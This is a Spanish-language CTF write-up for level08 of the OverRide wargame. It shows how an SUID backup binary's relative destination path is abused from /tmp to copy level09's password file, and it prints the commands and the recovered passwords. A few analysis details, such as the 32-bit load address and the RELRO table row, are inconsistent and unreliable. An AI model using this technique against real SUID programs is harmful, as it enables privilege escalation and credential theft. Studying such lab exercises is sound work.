# 1. Buscar Binario:

Listamos los archivos para que muestre el biarnio del `level08` y sus permisos:

```bash
level08@OverRide:~$ ls -la
total 28
dr-xr-x---+ 1 level08 level08   100 Oct 19  2016 .
dr-x--x--x  1 root    root      260 Oct  2  2016 ..
drwxrwx---+ 1 level09 users      60 Oct 19  2016 backups
-r--------  1 level08 level08     0 Oct 19  2016 .bash_history
-rw-r--r--  1 level08 level08   220 Sep 10  2016 .bash_logout
lrwxrwxrwx  1 root    root        7 Sep 13  2016 .bash_profile -> .bashrc
-rw-r--r--  1 level08 level08  3533 Sep 10  2016 .bashrc
-rwsr-s---+ 1 level09 users   12975 Oct 19  2016 level08
-rw-r-xr--+ 1 level08 level08    41 Oct 19  2016 .pass
-rw-r--r--  1 level08 level08   675 Sep 10  2016 .profile
-r--------  1 level08 level08  2235 Oct 19  2016 .viminfo
```

> **Nota:** El bit `s` en los permisos indica que es un binairo **SUID**. Se ejecuta con los privilegios del propietario (`level09`).

# 2. Analizamos las protecciones de la RAM
```bash
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Full RELRO      Canary found      NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level08/level08
```

### a). PIE:
```bash
level08@OverRide:~$ file ./level08 
./level08: setuid setgid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xf8990336d0891364d2754de14a6cc793677b9122, not stripped
```

## b). ASLR:
```bash
level05OverRide:~$ cat /proc/sys/kernel/randomize_va_space 
0
```

### c). NX y RELRO:
```bash
level08@OverRide:~$ readelf -l ./level08 | grep -E "RELRO|STACK"
  GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000
  GNU_RELRO      0x0000000000001d90 0x0000000000601d90 0x0000000000601d90
```

### d). STACK CANARY:
```bash
level08@OverRide:~$ nm ./level08 
0000000000601db8 d _DYNAMIC
0000000000601f68 d _GLOBAL_OFFSET_TABLE_
0000000000400d48 R _IO_stdin_used
                 w _Jv_RegisterClasses
0000000000601d98 d __CTOR_END__
0000000000601d90 d __CTOR_LIST__
0000000000601da8 D __DTOR_END__
0000000000601da0 d __DTOR_LIST__
0000000000400ed8 r __FRAME_END__
0000000000601db0 d __JCR_END__
0000000000601db0 d __JCR_LIST__
0000000000602010 A __bss_start
0000000000602000 D __data_start
0000000000400d00 t __do_global_ctors_aux
0000000000400830 t __do_global_dtors_aux
0000000000602008 D __dso_handle
                 w __gmon_start__
0000000000601d8c d __init_array_end
0000000000601d8c d __init_array_start
0000000000400cf0 T __libc_csu_fini
0000000000400c60 T __libc_csu_init
                 U __libc_start_main@@GLIBC_2.2.5
                 U __stack_chk_fail@@GLIBC_2.4    ⟸
0000000000602010 A _edata
0000000000602020 A _end
0000000000400d38 T _fini
00000000004006c0 T _init
00000000004007e0 T _start
000000000040080c t call_gmon_start
                 U close@@GLIBC_2.2.5
0000000000602010 b completed.6531
0000000000602000 W data_start
0000000000602018 b dtor_idx.6533
                 U exit@@GLIBC_2.2.5
                 U fclose@@GLIBC_2.2.5
                 U fgetc@@GLIBC_2.2.5
                 U fopen@@GLIBC_2.2.5
                 U fprintf@@GLIBC_2.2.5
00000000004008a0 t frame_dummy
00000000004008c4 T log_wrapper
00000000004009f0 T main
                 U open@@GLIBC_2.2.5
                 U printf@@GLIBC_2.2.5
                 U snprintf@@GLIBC_2.2.5
                 U strcpy@@GLIBC_2.2.5
                 U strcspn@@GLIBC_2.2.5
                 U strncat@@GLIBC_2.2.5
                 U write@@GLIBC_2.2.5
```

### e). `.got` y `.plt`:
```bash
level08@OverRide:~$ readelf -S ./level08 | grep -E ".got|.plt"
  [10] .rela.plt         RELA             0000000000400558  00000558
  [12] .plt              PROGBITS         00000000004006e0  000006e0
  [22] .got              PROGBITS         0000000000601f68  00001f68
```

---

# 3. Resumen del análisis:

**IMPORTANTE**:
Estamos ante un Binario de `64 bits` tal y como nos muestra `file ./level08`

| Protección | Estado | Evidencia | Consecuencias |
| --- | --- | --- | --- |
| **PIE** | **OFF** | `executable` | El binario siempre carga en `0x08048000`. |
| **ASLR** | **OFF** | `0` | El Heap y el Stack no se mueven; las direcciones son fijas. |
| **NX** | **OFF** | `RWE` | El Stack **SÍ** permite ejecución. Podemos meter y correr Shellcode allí. |
| **RELRO** | **FULL** | `R` | La sección `.got.plt` **NO** es escribible — GOT Hijack no es posible. |
| **CANARY** | **SÍ** | `__stack_chk_fail@@GLIBC_2.4` ⟸ | Hay "centinela" al final del stack. Si desbordamos el buffer el programa lo detectará y abortará. |
| **.got.plt** | **WA** | `WA` | Confirma sección `.got.plt` en escritura. |

---

# 4. Fuzzing:

Al ejecutar el binario sin argumentos el programa lanza un mensaje de `ERROR` en el que nos pide que el binario se ha de ejecuta con un argumento:
```bash
level08@OverRide:~$ ./level08
Usage: ./level08 filename
ERROR: Failed to open (null)
level08@OverRide:~$ 
```

Al listar el direcortio con `ls -la` vemos que hay un directorio nuevo llamado `backups` y que dentro de ese directorio hay un archivo de `errores` que podemos leer:


```bash
level08@OverRide:~$ cat backups/.log
LOG: Starting back up: backups/.log
```
Probamos a pasar ese archivo como argumento y nosmuestra el mensaje de `ERROR` al no poder abrir el archivo:

```bash
level08@OverRide:~$ ./level08 backups/.log 
ERROR: Failed to open ./backups/backups/.log
level08@OverRide:~$ 
```

Probamos con diferentes rutas:

```bash
level08@OverRide:~$ ./level08 backups/
ERROR: Failed to open ./backups/backups/
level08@OverRide:~$ ./level08 backups/
ERROR: Failed to open ./backups/backups/
level08@OverRide:~$ ./level08 backups/bin/sh
ERROR: Failed to open backups/bin/sh
```

El programa antepone `./backups/` a la ruta que le pasamos como argumento. Lo vemos en el error `"Failed to open ./backups/backups/.log"`. Esto sugiere que el programa abre el archivo de input y lo copia en `backups/`. Si pasamos una ruta que atraviese directorios podemos apuntar a archivos arbitrarios.

Probamos con path traversal:

```bash
level08@OverRide:~$ ./level08 .pass
LOG: Starting back up: .pass
level08@OverRide:~$ cat backups/.pass 
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```

---

# 5. Reverse Engineering (Target Identification):

El comando `nm` nos muestra funciones importantes:

```bash
00000000004008c4 T log_wrapper    ⟸
                 U strcpy@@GLIBC_2.2.5   ⟸
                 U strncat@@GLIBC_2.2.5  ⟸
                 U fopen@@GLIBC_2.2.5    ⟸
                 U fgetc@@GLIBC_2.2.5    ⟸
                 U open@@GLIBC_2.2.5     ⟸
                 U write@@GLIBC_2.2.5    ⟸
                 U __stack_chk_fail@@GLIBC_2.4 ⟸
```

* `log_wrapper()`: Función propia del binario. Gestiona el logging de operaciones.
* `strcpy()` y `strncat()`: Funciones de manipulación de strings. Posibles vectores de buffer overflow.
* `fopen()`, `fgetc()`, `open()`, `write()`: El programa abre un archivo de input y escribe en otro .Lógica de backup.
* `__stack_chk_fail()`: Hay Stack Canary — no podemos desbordar el buffer directamente.

**Importante:** El programa construye la ruta de destino anteponiendo `./backups/` al argumento — si usamos **path traversal** podemos hacer que el backup sobreescriba archivos arbitrarios, como el `.pass` de `level09`.

Para ver con detalle el análisis consulta el archivo
[asm_analysis.md](https://github.com/4trastos/OverRide/blob/main/level08/Resources/README.md)
en conjunto con el programa de demostración
[source.c](https://github.com/4trastos/OverRide/blob/main/level08/source.c).

---

# Flujo de Ataque para el Nivel 08

## 1. Lectura:

La vulnerabilidad está en `main()` — el programa construye la ruta de destino
anteponiendo `"./backups/"` al argumento:

```c
strcpy(dst_path, "./backups/");
strncat(dst_path, argv[1], 99 - strlen(dst_path));
fd = open(dst_path, 0xc1, 0x1b0);
```

El programa usa el directorio actual como base para construir la ruta de destino. Si nos movemos a `/tmp` y creamos la estructura de directorios necesaria, podemos hacer que el `open()` del destino funcione con una ruta
absoluta.

## 2. Vulnerabilidad:

* El programa abre `argv[1]` en modo lectura y lo copia en `"./backups/" + argv[1]`.
* No hay validación del argumento — podemos pasar una ruta absoluta.
* El binario es **SUID level09** — abre `argv[1]` con los privilegios de `level09`.
* El `.pass` de `level09` en `/home/users/level09/.pass` es legible con esos privilegios.

## 3. Explotación:

* **Paso 1:** Nos movemos a `/tmp`. El programa construirá el destino como `./backups/` relativo a `/tmp`.
* **Paso 2:** Creamos la estructura de directorios en `/tmp` para que el `open()` del destino no falle:
```bash
mkdir -p backups/home/users/level09/
```
* **Paso 3:** Ejecutamos el binario con la ruta absoluta del `.pass` de `level09`:
```bash
~/level08 /home/users/level09/.pass
```
Esto hace que:
- `fopen(argv[1], "r")` abre `/home/users/level09/.pass` con privilegios de `level09`.
- `open(dst_path, ...)` crea `./backups//home/users/level09/.pass` en `/tmp`.

# 6. Solución:

```bash
level08@OverRide:~$ cd /tmp
level08@OverRide:/tmp$ mkdir -p backups/home/users/level09/
level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass
level08@OverRide:/tmp$ cat backups/home/users/level09/.pass
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```

---

# 7. Conclusión:

El nivel 08 no requiere explotar ninguna vulnerabilidad de memoria. El vector de ataque es **path traversal** combinado con el uso del **directorio de trabajo**.
El programa construye la ruta de destino relativa al directorio actual. Si nos movemos a `/tmp` y creamos la estructura de directorios necesaria, el `open()` del destino funciona. Como el binario es SUID de `level09`, el `fopen()` del origen puede leer el `.pass` de `level09` que normalmente no es accesible para `level08`.